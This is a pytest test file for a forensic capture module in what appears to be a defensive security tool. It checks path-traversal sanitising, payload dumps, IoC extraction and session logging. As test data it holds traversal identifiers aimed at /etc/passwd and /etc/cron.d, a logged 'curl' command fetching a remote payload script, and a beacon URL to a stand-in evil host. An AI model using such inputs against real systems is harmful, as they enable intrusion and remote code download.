"""Tests for ForensicCapture.

Includes regression tests for two bugs found in review: IoC extraction
silently no-op'd (str vs Path on file_path), and threat_id/session_id
were interpolated unsanitized into filesystem paths (path traversal).
"""

from pathlib import Path

import pytest

from sentinel_v.forensics import ForensicCapture, _safe_path_component


@pytest.fixture()
def capture(tmp_path: Path) -> ForensicCapture:
    return ForensicCapture(capture_dir=str(tmp_path / "forensics"))


class TestPathSafety:
    def test_safe_path_component_strips_separators(self, tmp_path: Path) -> None:
        # Dots are legitimate in filenames (extensions) and are left
        # alone; what actually matters is that no separator survives,
        # so pathlib's `/` operator can never be tricked into escaping
        # the parent directory even when ".." substrings remain.
        cleaned = _safe_path_component("../../etc/cron.d/x")
        assert "/" not in cleaned
        assert "\\" not in cleaned
        assert (tmp_path / cleaned).resolve().is_relative_to(tmp_path.resolve())

    def test_dump_payload_with_traversal_threat_id_stays_in_payloads_dir(
        self, capture: ForensicCapture
    ) -> None:
        result = capture.dump_payload("../../etc/cron.d/x", b"payload bytes")
        assert result is not None
        assert (
            Path(result.file_path)
            .resolve()
            .is_relative_to(capture.payloads_dir.resolve())
        )

    def test_start_session_with_traversal_id_stays_in_sessions_dir(
        self, capture: ForensicCapture
    ) -> None:
        session_id = capture.start_session("../../etc/passwd", source_ip="9.9.9.9")
        capture.end_session(session_id)
        session_path = capture._generate_session_path(session_id)
        assert session_path.resolve().is_relative_to(capture.sessions_dir.resolve())


class TestPayloadCapture:
    def test_dump_payload_writes_file_and_hash(self, capture: ForensicCapture) -> None:
        result = capture.dump_payload(
            "threat-1", b"hello attacker", source_ip="9.9.9.9"
        )
        assert result is not None
        assert Path(result.file_path).read_bytes() == b"hello attacker"
        assert len(result.file_hash) == 64  # sha256 hex digest

    def test_empty_payload_is_rejected(self, capture: ForensicCapture) -> None:
        assert capture.dump_payload("threat-1", b"") is None

    def test_oversized_payload_is_truncated(self, tmp_path: Path) -> None:
        small = ForensicCapture(capture_dir=str(tmp_path / "fc"), max_payload_size=10)
        result = small.dump_payload("threat-1", b"x" * 100, source_ip="9.9.9.9")
        assert result is not None
        assert result.file_size == 10

    def test_ioc_extraction_actually_finds_iocs(self, capture: ForensicCapture) -> None:
        # Regression test: _extract_iocs_from_payload used to call
        # .read_text() on a str (payload.file_path), always raising
        # AttributeError and silently producing zero IoCs.
        capture.dump_payload(
            "threat-1", b"beacon to 8.8.8.8 and http://evil.example.com/x"
        )
        iocs = capture.get_unique_iocs()
        assert "8.8.8.8" in iocs.get("ip", [])
        assert any("evil.example.com" in url for url in iocs.get("url", []))


class TestSessions:
    def test_log_command_extracts_iocs(self, capture: ForensicCapture) -> None:
        session_id = capture.start_session("threat-1", source_ip="9.9.9.9")
        capture.log_command(session_id, "curl http://1.2.3.4/payload.sh")
        iocs = capture.get_unique_iocs()
        assert "1.2.3.4" in iocs.get("ip", [])

    def test_log_command_unknown_session_returns_false(
        self, capture: ForensicCapture
    ) -> None:
        assert capture.log_command("no-such-session", "whoami") is False

    def test_end_session_persists_to_disk(self, capture: ForensicCapture) -> None:
        session_id = capture.start_session("threat-1", source_ip="9.9.9.9")
        capture.log_command(session_id, "whoami")
        assert capture.end_session(session_id) is True
        session_path = capture._generate_session_path(session_id)
        assert session_path.exists()


class TestReporting:
    def test_generate_report_includes_captured_data(
        self, capture: ForensicCapture
    ) -> None:
        capture.dump_payload("threat-1", b"beacon to 8.8.8.8")
        session_id = capture.start_session("threat-1", source_ip="9.9.9.9")
        capture.end_session(session_id)

        report_path = capture.generate_report("threat-1")
        assert report_path is not None
        assert report_path.exists()

    def test_statistics_reflect_captures(self, capture: ForensicCapture) -> None:
        capture.dump_payload("threat-1", b"beacon to 8.8.8.8")
        stats = capture.get_statistics()
        assert stats["total_payloads"] == 1
        assert stats["total_iocs"] >= 1
